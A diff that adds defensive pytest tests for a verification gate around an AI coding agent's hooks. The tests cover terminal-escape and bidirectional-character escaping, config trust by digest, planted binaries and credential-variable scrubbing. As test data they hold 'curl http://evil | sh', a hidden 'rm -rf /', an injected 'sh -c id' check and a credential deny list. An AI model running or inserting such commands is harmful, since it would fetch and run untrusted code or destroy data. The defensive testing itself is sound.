@@ -1743,3 +1743,581 @@ def test_gate_result_objects_carry_the_evidence(tmp_path, state):
         "2 check(s) passed" in out.reason
         and out.seconds >= sum(r.seconds for r in out.results) * 0.5
     )
+
+
+# =================================================================================================================
+# review hardening: what a person reads before trusting, one read of the file, planted binaries, the environment,
+# the fingerprint, the block cap, the process tree, the time budget
+# =================================================================================================================
+def test_safe_text_writes_out_what_a_terminal_would_obey():
+    assert verify.safe_text("a\x1b[2K\r b") == "a\\x1b[2K\\x0d b"
+    assert verify.safe_text("tab\there\x7f") == "tab\\x09here\\x7f"
+    assert verify.safe_text("x\u202ey\u2066z\u200b") == "x\\u202ey\\u2066z\\u200b"
+    assert verify.safe_text("l\u2028m\u0085n\u00a0o") == "l\\u2028m\\x85n\\xa0o"
+    assert verify.safe_text("blank\u3164 sel\ufe0f") == "blank\\u3164 sel\\ufe0f"
+    assert verify.safe_text("tag\U000e0041") == "tag\\U000e0041"
+    for fine in ("plain text", "caf\u00e9 \u65e5\u672c\u8a9e", "C:\\Program Files\\x\\y.exe", ""):
+        assert (
+            verify.safe_text(fine) == fine
+        )  # printable text in any script, spaces and paths stay as they are
+
+
+def test_command_line_cannot_hide_a_command_behind_an_escape_sequence():
+    chk = Check(
+        "lint", ["sh", "-c", "curl http://evil | sh", "\x1b[2K\r  [fast] lint: ruff check ."]
+    )
+    shown = verify.command_line(chk)
+    assert "\x1b" not in shown and "\r" not in shown and "\n" not in shown
+    assert "curl http://evil | sh" in shown and "\\x1b[2K\\x0d" in shown
+    flipped = verify.command_line(Check("x", ["echo", "safe\u202e'; rm -rf /'"]))
+    assert "\u202e" not in flipped and "\\u202e" in flipped
+
+
+def test_render_toml_writes_out_terminal_controls_and_still_round_trips(tmp_path):
+    hostile = "a\u202eb\u2028c\x85d\x7fe\u200bf\ud800g"
+    chk = Check("n\u00e9", [PY, "-c", hostile], 5, "sub\u2066x")
+    recipe = Recipe([chk], [chk], "src\u202e\n", notes=["note\u202e\x1b[2Kz"])
+    text = verify.render_toml(recipe)
+    for raw in ("\u202e", "\u2028", "\x85", "\x7f", "\u200b", "\u2066", "\x1b", "\ud800"):
+        assert raw not in text, repr(raw)
+    write_raw(tmp_path, text)
+    loaded = verify.load(tmp_path).fast[0]
+    assert loaded.argv[2] == hostile.replace(
+        "\ud800", "\ufffd"
+    )  # a lone surrogate cannot live in TOML
+    assert loaded.cwd == chk.cwd and loaded.name == chk.name
+
+
+def test_load_checked_is_one_read_with_its_digest(tmp_path, state):
+    import hashlib
+
+    repo = make_repo(tmp_path)
+    assert verify.load_checked(repo) == verify.Loaded(None, None, None)
+    assert verify.trust_state_of(repo, state, None) == "no-config"
+    assert verify.trust_state_of(repo, state, b"[[fast") == "invalid"
+    write_cfg(repo, [pycheck("a", "pass")])
+    got = verify.load_checked(repo)
+    assert got.recipe.fast[0].name == "a" and got.data == verify.config_path(repo).read_bytes()
+    assert got.sha256 == hashlib.sha256(got.data).hexdigest()
+    assert verify.trust_state_of(repo, state, got.data) == "untrusted"
+    verify.trust(repo, state, expect_sha256=got.sha256)
+    assert verify.trust_state_of(repo, state, got.data) == "trusted"
+    assert verify.trust_state_of(repo, state, got.data + b"# edit\n") == "modified"
+
+
+def test_trust_refuses_a_file_that_changed_after_it_was_shown(tmp_path, state):
+    repo = make_repo(tmp_path)
+    write_cfg(repo, [pycheck("a", "pass")])
+    shown = verify.load_checked(repo)
+    swapped = shown.data + b'\n[[fast]]\nname = "evil"\nargv = ["sh", "-c", "id"]\n'
+    verify.config_path(repo).write_bytes(swapped)  # a git checkout, an editor, another session
+    with pytest.raises(VerifyConfigError, match="changed after it was shown"):
+        verify.trust(repo, state, expect_sha256=shown.sha256)
+    assert not (state / "verify-trust.json").exists() and not verify.is_trusted(repo, state)
+    now = verify.load_checked(repo)  # reading it again and approving what is there now is fine
+    assert verify.trust(repo, state, expect_sha256=now.sha256) == now.sha256
+    assert verify.is_trusted(repo, state)
+
+
+def test_untrust_removes_the_record_while_the_recipe_is_broken_or_gone(tmp_path, state):
+    repo = make_repo(tmp_path)
+    write_cfg(repo, [pycheck("a", "pass")])
+    verify.trust(repo, state)
+    write_raw(repo, "[[fast")  # no longer valid TOML
+    assert verify.trust_state(repo, state) == "invalid"
+    assert verify.untrust(repo, state) is True
+    assert json.loads((state / "verify-trust.json").read_text(encoding="utf-8")) == {}
+    write_cfg(repo, [pycheck("a", "pass")])
+    verify.trust(repo, state)
+    verify.config_path(repo).unlink()
+    assert verify.untrust(repo, state) is True
+    assert json.loads((state / "verify-trust.json").read_text(encoding="utf-8")) == {}
+
+
+def _tool(directory, name, says):
+    """An executable `name` that prints `says` (a .cmd on Windows, a shell script elsewhere)."""
+    directory.mkdir(parents=True, exist_ok=True)
+    if os.name == "nt":
+        path = directory / f"{name}.cmd"
+        path.write_bytes(f"@echo off\r\necho {says}\r\n".encode())
+    else:
+        path = directory / name
+        path.write_text(f"#!/bin/sh\necho {says}\n", encoding="utf-8")
+        path.chmod(0o755)
+    return path
+
+
+def test_relative_path_entries_never_resolve_a_tool(tmp_path, monkeypatch):
+    _tool(tmp_path / "node_modules" / ".bin", "hrtool", "planted")
+    _tool(tmp_path, "hrtool", "planted at the root")
+    good = _tool(tmp_path / "good", "hrtool", "approved")
+    monkeypatch.chdir(tmp_path)  # the hook's working directory is the repository
+    relative = os.path.join("node_modules", ".bin")
+    for only in (relative, os.curdir, os.pathsep, ""):
+        assert verify._resolve_exe("hrtool", tmp_path, only) is None, repr(only)
+    first_relative = os.pathsep.join([relative, os.curdir, str(good.parent)])
+    assert Path(verify._resolve_exe("hrtool", tmp_path, first_relative)).parent == good.parent
+    assert not verify._is_absolute_dir("\\tools") and verify._is_absolute_dir(str(tmp_path))
+
+    original = os.environ["PATH"]
+    monkeypatch.setenv("PATH", os.pathsep.join([relative, str(good.parent), original]))
+    ran = verify.run(tmp_path, [Check("t", ["hrtool"], 30)]).results[0]
+    assert ran.rc == 0 and ran.output == "approved"
+    monkeypatch.setenv("PATH", os.pathsep.join([relative, os.curdir, original]))
+    assert verify.run(tmp_path, [Check("t", ["hrtool"], 30)]).results[0].rc == 127
+
+
+def test_git_is_never_taken_from_the_working_directory(tmp_path, monkeypatch):
+    import shutil
+
+    repo = make_repo(tmp_path)
+    plant = tmp_path / "plant"
+    plant.mkdir()
+    marker = tmp_path / "git-ran"
+    if os.name == "nt":
+        shutil.copy(
+            PY, plant / "git.exe"
+        )  # started with git's arguments it fails, it never prints `git version`
+    else:
+        (plant / "git").write_text(f"#!/bin/sh\necho planted > {marker}\n", encoding="utf-8")
+        (plant / "git").chmod(0o755)
+    monkeypatch.chdir(plant)
+    # no help from the environment: Windows must not be told to skip the current directory, POSIX gets `.` on PATH
+    monkeypatch.delenv("NoDefaultCurrentDirectoryInExePath", raising=False)
+    monkeypatch.setenv("PATH", os.pathsep.join([os.curdir, os.environ["PATH"]]))
+    verify._GIT_EXE.clear()
+    res = verify._git(repo, "--version")
+    assert res is not None and res[0].startswith(b"git version") and not marker.exists()
+    assert verify._git_exe() and os.path.isabs(verify._git_exe())
+    assert verify.fingerprint(repo) and not marker.exists()
+    verify._GIT_EXE.clear()
+
+
+@pytest.mark.parametrize(
+    "name",
+    [
+        "MY_API_TOKEN",
+        "ANTHROPIC_API_KEY",
+        "CLAUDE_CODE_OAUTH_TOKEN",
+        "DB_PASSWORD",
+        "GPG_PASSPHRASE",
+        "DB_PASS",
+        "SMTP_PASS",
+        "MYSQL_PWD",
+        "PGPASSFILE",
+        "NPM_CONFIG__AUTH",
+        "NPM_CONFIG_REGISTRY",
+        "AZURE_DEVOPS_EXT_PAT",
+        "AWS_ACCESS_KEY_ID",
+        "AWS_REGION",
+        "GOOGLE_APPLICATION_CREDENTIALS",
+        "GCP_PROJECT",
+        "GITHUB_TOKEN",
+        "GH_TOKEN",
+        "DATABASE_URL",
+        "SENTRY_DSN",
+        "SSH_AUTH_SOCK",
+        "SSH_ASKPASS",
+        "GIT_ASKPASS",
+        "SESSION_COOKIE_JAR",
+        "REDIS_CONNECTION_STRING",
+        "TLS_PRIVATE_FILE",
+        "CLIENT_CERT_PEM",
+        "some_lower_case_secret",
+    ],
+)
+def test_scrubbed_env_drops_credential_looking_names(name):
+    env = verify.scrubbed_env({name: "v", "PATH": "/bin"})
+    assert name not in env and "PATH" in env, name
+    assert verify.is_secret_env(name)
+
+
+@pytest.mark.parametrize(
+    "name",
+    [
+        "PATH",
+        "HOME",
+        "USERPROFILE",
+        "SYSTEMROOT",
+        "TEMP",
+        "TMP",
+        "APPDATA",
+        "LOCALAPPDATA",
+        "CARGO_HOME",
+        "VIRTUAL_ENV",
+        "GIT_AUTHOR_NAME",
+        "GIT_COMMITTER_EMAIL",
+        "SSL_CERT_FILE",
+        "NODE_EXTRA_CA_CERTS",
+        "LANG",
+        "PYTHONPATH",
+        "CLAUDECODE",  # claude-hr-ctl refuses `verify trust` in a shell that has it
+        "CLAUDE_HR_HOME",
+        "HARMLESS_SETTING",
+    ],
+)
+def test_scrubbed_env_keeps_what_toolchains_need(name):
+    assert verify.scrubbed_env({name: "v"})[name] == "v" and not verify.is_secret_env(name)
+
+
+def test_scrubbed_env_drops_values_that_carry_url_credentials():
+    base = {
+        "HTTPS_PROXY": "http://user:pass@proxy.example:3128",
+        "PIP_INDEX_URL": "https://__token__:abc123@pypi.example/simple",
+        "OK_PROXY": "http://proxy.example:3128",
+        "OK_INDEX": "https://pypi.org/simple",
+        "NOT_A_URL": "a:b@c",
+    }
+    assert set(verify.scrubbed_env(base)) == {
+        "OK_PROXY",
+        "OK_INDEX",
+        "NOT_A_URL",
+        "CI",
+        verify.ACTIVE_ENV,
+    }
+
+
+def test_the_credential_deny_list_is_one_set_of_module_constants():
+    """fmt.py applies the same rules: it must be able to import them from here."""
+    for const in ("SECRET_ENV_WORDS", "SECRET_ENV_PREFIXES", "SECRET_ENV_NAMES", "KEEP_ENV"):
+        assert getattr(verify, const), const
+    assert {"TOKEN", "SECRET", "PASS", "PWD", "KEY", "CRED", "AUTH"} <= set(verify.SECRET_ENV_WORDS)
+    assert "ANTHROPIC_" in verify.SECRET_ENV_PREFIXES and "DATABASE_URL" in verify.SECRET_ENV_NAMES
+
+
+def test_gate_block_cap_holds_for_a_check_that_writes_a_file_every_run(tmp_path, state):
+    code = "import time; open('test.log', 'a').write(str(time.time())); raise SystemExit(1)"
+    repo = gated_repo(tmp_path, state, [pycheck("unit", code)])
+    put(repo, "code.txt", "edited\n")  # Claude's one real change
+    actions = [verify.gate(repo, state, max_blocks=2) for _ in range(6)]
+    assert [o.action for o in actions] == ["block", "block", "skip", "skip", "skip", "skip"]
+    assert "block cap reached (2/2)" in actions[2].reason and "unit failed" in actions[2].reason
+    assert (repo / "test.log").read_text().count(".") == 2, "the failing check ran exactly twice"
+    put(repo, "code.txt", "edited again\n")  # a real change by Claude gets a fresh budget
+    assert verify.gate(repo, state, max_blocks=2).action == "block"
+
+
+def test_gate_block_cap_with_a_check_that_leaves_a_file_only_once(tmp_path, state):
+    code = "import os, sys; open('out.bin', 'ab').write(b'x') if not os.path.exists('out.bin') else 0; sys.exit(1)"
+    repo = gated_repo(tmp_path, state, [pycheck("unit", code)])
+    put(repo, "code.txt", "edited\n")
+    actions = [verify.gate(repo, state, max_blocks=2).action for _ in range(4)]
+    assert actions == ["block", "block", "skip", "skip"], (
+        "was 3 blocks: the first one counted under the old tree"
+    )
+
+
+def test_gate_green_run_that_leaves_files_behind_is_not_run_again(tmp_path, state):
+    code = "import time; open('coverage.xml', 'a').write(str(time.time()))"
+    repo = gated_repo(tmp_path, state, [pycheck("cov", code)])
+    put(repo, "code.txt", "edited\n")
+    first = verify.gate(repo, state)
+    assert first.action == "pass"
+    again = verify.gate(repo, state)  # the tree is now the one the passing run left behind
+    assert again.action == "skip" and "unchanged since the last passing run" in again.reason
+    assert (repo / "coverage.xml").read_text().count(".") == 1
+    put(repo, "code.txt", "edited once more\n")
+    assert verify.gate(repo, state).action == "pass"
+
+
+def test_mark_block_and_green_record_both_trees_without_changing_the_old_shape():
+    entry: dict = {}
+    verify._mark_block("a", "summary")(entry)
+    assert entry == {"blocks": {"a": 1}, "last_block": {"fp": "a", "summary": "summary"}}
+    verify._mark_block("a", "summary", "b")(entry)
+    assert entry["blocks"] == {"a": 2, "b": 2}
+    assert entry["last_block"] == {"fp": "a", "summary": "summary", "fp_after": "b"}
+    verify._mark_green("c", "d")(entry)
+    assert entry == {"last_green": "c", "last_green_after": "d", "blocks": {}}
+    verify._mark_green("c")(entry)
+    assert "last_green_after" not in entry
+
+
+def test_fingerprint_sees_an_in_place_edit_of_every_untracked_file(tmp_path):
+    repo = make_repo(tmp_path)
+    for i in range(3000):  # was capped at 200: later files were invisible to an in-place edit
+        put(repo, f"pkg{i % 40}/src/mod{i:04d}.py", f"x = {i}\n")
+    t0 = time.monotonic()
+    base = verify.fingerprint(repo)
+    took = time.monotonic() - t0
+    assert base and took < 10, f"3000 untracked files took {took:.1f}s"
+    for rel in ("pkg0/src/mod0000.py", "pkg19/src/mod1499.py", "pkg39/src/mod2999.py"):
+        before = verify.fingerprint(repo)
+        put(repo, rel, "x = 'edited in place, and longer'\n")
+        assert verify.fingerprint(repo) != before, rel
+
+
+def test_fingerprint_is_deterministic_for_many_untracked_files(tmp_path):
+    repo = make_repo(tmp_path)
+    for i in range(300):
+        put(repo, f"d{i % 7}/f{i}.txt", f"{i}\n")
+    assert verify.fingerprint(repo) == verify.fingerprint(repo)
+
+
+def test_fingerprint_cannot_tell_when_git_truncated_the_listing_or_time_ran_out(
+    tmp_path, monkeypatch
+):
+    repo = make_repo(tmp_path)
+    assert verify.fingerprint(repo)
+    assert verify.fingerprint(repo, deadline=time.monotonic() - 1) == ""
+    real = verify._git
+    with monkeypatch.context() as m:
+        m.setattr(
+            verify,
+            "_git",
+            lambda top, *a, **k: (
+                (b"?? x\0", True) if a and a[0] == "status" else real(top, *a, **k)
+            ),
+        )
+        assert verify.fingerprint(repo) == ""
+
+
+_HOSTILE_LINES = {
+    "timeouts": "timeout" * 8_000 + " = x",  # 56 KB: the old pattern needed ~17 s here
+    "approx and spaces": "approx(" + " " * 150_000 + "x" + "y" * 50_000,
+    "approx nested": "approx(" * 30_000,
+    "assert word": "assert" * 30_000 + "x",
+    "assert spaces": "assert" + " " * 200_000,
+    "plain word": "a" * 200_000,
+    "dotted words": "a." * 100_000,
+    "spaces": " " * 200_000,
+    "hash and spaces": "#" + " " * 200_000 + "x",
+    "hashes": "# " * 100_000,
+    "open parens": "(" * 200_000,
+    "digits": "1" * 200_000 + "x",
+}
+
+
+@pytest.mark.parametrize("label", sorted(_HOSTILE_LINES))
+def test_weakening_patterns_are_linear_on_hostile_lines(label):
+    """The patterns see text from the repository: none may be superlinear (`\\w*timeout\\w*` took 17 s for 56 KB)."""
+    text = _HOSTILE_LINES[label]
+    patterns = [
+        verify._TOL_KW_RE,
+        verify._TOL_POS_RE,
+        verify._ASSERT_RE,
+        verify._SUPPRESS_RE,
+        verify._NUM_RE,
+        *verify._SKIP_RES,
+    ]
+    for rx in patterns:
+        t0 = time.monotonic()
+        list(rx.finditer(text))
+        took = time.monotonic() - t0
+        assert took < 2.0, f"{rx.pattern[:40]!r} took {took:.1f}s on {label}"
+
+
+def test_tolerances_still_find_what_they_found_before_and_bound_a_line():
+    assert verify._tolerances("    atol=0.001, rtol = 1e-5") == {"atol": 0.001, "rtol": 1e-5}
+    assert verify._tolerances("client.get(url, request_timeout: 30)") == {"request_timeout": 30.0}
+    assert verify._tolerances("assert x == approx(1.0, 0.01)") == {"approx": 0.01}
+    assert verify._tolerances("total = 5; user_name: 7") == {}
+    t0 = time.monotonic()
+    assert verify._tolerances("timeout" * 8_000 + " = x") == {}
+    assert time.monotonic() - t0 < 1.0
+
+
+def test_weakening_a_hostile_line_neither_stalls_nor_hides_other_findings(tmp_path):
+    base = {
+        "tests/test_a.py": 'def test_x():\n    payload = "'
+        + "timeout" * 8_000
+        + '"\n    assert f(1) == 1\n'
+    }
+    t0 = time.monotonic()
+    found = weak(tmp_path, base, {"tests/test_a.py": "def test_x():\n    payload = 'ok'\n"})
+    assert time.monotonic() - t0 < 10
+    assert found == ["tests/test_a.py: 1 assertion line(s) removed without a replacement"]
+
+
+def test_advisories_stop_at_their_deadline():
+    diff = (
+        "diff --git a/tests/test_a.py b/tests/test_a.py\n--- a/tests/test_a.py\n+++ b/tests/test_a.py\n"
+        "@@ -1,2 +1,1 @@\n-    assert f(1) == 1\n-    assert f(2) == 2\n+    assert f(1) == 1\n"
+    )
+    assert len(verify._advisories(diff)) == 1
+    assert verify._advisories(diff, deadline=time.monotonic() - 1) == []
+    assert verify._parse_diff("diff --git a/x b/x\n@@ -1 +1 @@\n+" + "y" * 10_000)[0].added == [
+        "y" * verify._MAX_LINE
+    ]
+
+
+def _skip_if_no_job_objects():
+    """On Windows the leftovers of a finished check are ended through a job object. An environment that forbids a
+    job inside its own (some CI sandboxes) falls back to taskkill on a timeout only: nothing to test there."""
+    if os.name != "nt":
+        return
+    probe = subprocess.Popen(
+        [PY, "-c", "import time; time.sleep(30)"],
+        stdin=subprocess.DEVNULL,
+        stdout=subprocess.DEVNULL,
+    )
+    try:
+        job = verify._Job(probe)
+        usable = job._handle is not None
+        job.close()
+    finally:
+        probe.kill()
+    if not usable:
+        pytest.skip("this environment does not allow a job object for a child process")
+
+
+def test_run_ends_the_children_a_finished_check_left_behind(tmp_path):
+    _skip_if_no_job_objects()
+    script = put(
+        tmp_path,
+        "leave.py",
+        "import subprocess, sys\n"
+        "quiet = {'stdin': subprocess.DEVNULL, 'stdout': subprocess.DEVNULL, 'stderr': subprocess.DEVNULL}\n"
+        "p = subprocess.Popen([sys.executable, '-c', 'import time; time.sleep(120)'], **quiet)\n"
+        "open(sys.argv[1], 'w').write(str(p.pid))\n",
+    )
+    pidfile = tmp_path / "left.pid"
+    res = verify.run(tmp_path, [Check("leaver", [PY, str(script), str(pidfile)], 30)])
+    assert res.results[0].rc == 0
+    child = int(pidfile.read_text())
+    try:
+        deadline = time.monotonic() + 10
+        while alive(child) and time.monotonic() < deadline:
+            time.sleep(0.1)
+        assert not alive(child), "a backgrounded child outlived the check that started it"
+    finally:
+        kill_pid(child)
+
+
+def test_run_ends_a_child_that_holds_the_pipe_open_and_still_returns_fast(tmp_path):
+    _skip_if_no_job_objects()
+    spawner = put(
+        tmp_path,
+        "holder.py",
+        "import subprocess, sys\n"
+        "p = subprocess.Popen([sys.executable, '-c', 'import time; time.sleep(120)'])\n"
+        "open(sys.argv[1], 'w').write(str(p.pid))\n"
+        "print('parent done')\n",
+    )
+    pidfile = tmp_path / "holder.pid"
+    t0 = time.monotonic()
+    try:
+        r = verify.run(tmp_path, [Check("holder", [PY, str(spawner), str(pidfile)], 30)]).results[0]
+        assert r.rc == 0 and r.output == "parent done" and time.monotonic() - t0 < 15
+        child = int(pidfile.read_text())
+        deadline = time.monotonic() + 10
+        while alive(child) and time.monotonic() < deadline:
+            time.sleep(0.1)
+        assert not alive(child)
+    finally:
+        if pidfile.exists():
+            kill_pid(int(pidfile.read_text()))
+
+
+@pytest.mark.skipif(os.name != "nt", reason="job objects are Windows only")
+def test_a_job_object_holds_a_check_and_ends_it_with_everything_it_started(tmp_path):
+    _skip_if_no_job_objects()
+    proc = subprocess.Popen(
+        [PY, "-c", "import time; time.sleep(60)"],
+        stdin=subprocess.DEVNULL,
+        stdout=subprocess.DEVNULL,
+        creationflags=0x00000200,
+    )
+    job = verify._Job(proc)
+    try:
+        assert job._handle is not None, "this environment should allow a job (nested ones included)"
+        assert job.terminate() is True
+        assert proc.wait(timeout=10) is not None
+    finally:
+        job.close()
+        if proc.poll() is None:
+            proc.kill()
+    verify._Job(proc).close()  # a process that is gone: whatever happens, no exception
+
+
+@pytest.mark.skipif(os.name != "nt", reason="job objects are Windows only")
+def test_a_check_dies_with_the_hook_that_started_it_when_the_hook_is_killed(tmp_path):
+    """The host kills a hook that overruns its timeout; the check it started must not be left running."""
+    _skip_if_no_job_objects()
+    pidfile = tmp_path / "child.pid"
+    code = (
+        "import subprocess, sys, time\n"
+        f"sys.path.insert(0, {str(Path(verify.__file__).resolve().parents[1])!r})\n"
+        "from claude_hr import verify\n"
+        "child = subprocess.Popen([sys.executable, '-c', 'import time; time.sleep(120)'], "
+        "creationflags=0x00000200)\n"
+        "job = verify._Job(child)\n"
+        f"open({str(pidfile)!r}, 'w').write(str(child.pid))\n"
+        "time.sleep(120)\n"
+    )
+    hook = subprocess.Popen([PY, "-c", code], stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+    child = None
+    try:
+        deadline = time.monotonic() + 20
+        while not pidfile.exists() and time.monotonic() < deadline:
+            time.sleep(0.1)
+        time.sleep(0.3)
+        child = int(pidfile.read_text())
+        assert alive(child)
+        hook.kill()  # what the host does at the hook's timeout: this process only, not its children
+        hook.wait(timeout=10)
+        deadline = time.monotonic() + 10
+        while alive(child) and time.monotonic() < deadline:
+            time.sleep(0.1)
+        assert not alive(child), "the job did not end the check with the hook"
+    finally:
+        if hook.poll() is None:
+            hook.kill()
+        if child is not None:
+            kill_pid(child)
+
+
+def test_gate_with_too_little_time_left_starts_nothing_and_records_nothing(tmp_path, state):
+    marker = tmp_path / "marker"
+    repo = gated_repo(tmp_path, state, [marker_check(marker)])
+    out = verify.gate(repo, state, deadline=time.monotonic() + 3)
+    assert out.action == "skip" and out.note == "time budget" and out.results == []
+    assert "time budget" in out.reason and runs(marker) == 0
+    assert not (state / "verify-gate.json").exists(), (
+        "nothing was looked at: the next Stop must run it"
+    )
+    assert verify.gate(repo, state).action == "pass" and runs(marker) == 1
+
+
+def test_gate_checks_get_what_is_left_of_the_deadline_not_their_own_limit(
+    tmp_path, state, monkeypatch
+):
+    monkeypatch.setattr(verify, "POST_RUN_RESERVE_S", 1.0)
+    monkeypatch.setattr(verify, "MIN_RUN_S", 1.0)
+    repo = gated_repo(tmp_path, state, [pycheck("slow", "import time; time.sleep(60)", timeout=60)])
+    t0 = time.monotonic()
+    out = verify.gate(repo, state, timeout_s=120, deadline=t0 + 6)
+    assert time.monotonic() - t0 < 20
+    assert out.action == "skip" and out.note == "time budget" and "inconclusive" in out.reason
+    assert out.results and out.results[0].clamped
+    assert not (state / "verify-gate.json").exists()
+
+
+def test_gate_without_a_deadline_is_unchanged_by_the_budget_logic(tmp_path, state):
+    marker = tmp_path / "marker"
+    repo = gated_repo(tmp_path, state, [marker_check(marker)])
+    out = verify.gate(
+        repo, state, timeout_s=2
+    )  # smaller than MIN_RUN_S: only a deadline enforces a minimum
+    assert out.action == "pass" and out.note == ""
+
+
+def test_the_security_modules_contain_no_hidden_or_bidirectional_characters():
+    """The modules that defend against characters a reader cannot see must not contain any themselves."""
+    src = Path(__file__).resolve().parents[1] / "src" / "claude_hr"
+    for name in ("verify.py", "stop_gate.py", "ctl.py", "procutil.py"):
+        text = (src / name).read_text(encoding="utf-8")
+        odd = sorted(
+            {
+                hex(ord(c))
+                for c in text
+                if c != "\n" and (not c.isprintable() or verify._BLANKS.match(c))
+            }
+        )
+        assert not odd, f"{name}: {odd}"
+
+
+def test_run_output_loses_c1_controls_too(tmp_path):
+    code = "import sys; sys.stdout.buffer.write(b'a\\xc2\\x9b31mb\\xc2\\x85c\\n')"
+    out = verify.run(tmp_path, [pycheck("c1", code)]).results[0].output
+    assert out == "a31mbc" and not any(0x7F <= ord(c) <= 0x9F for c in out)
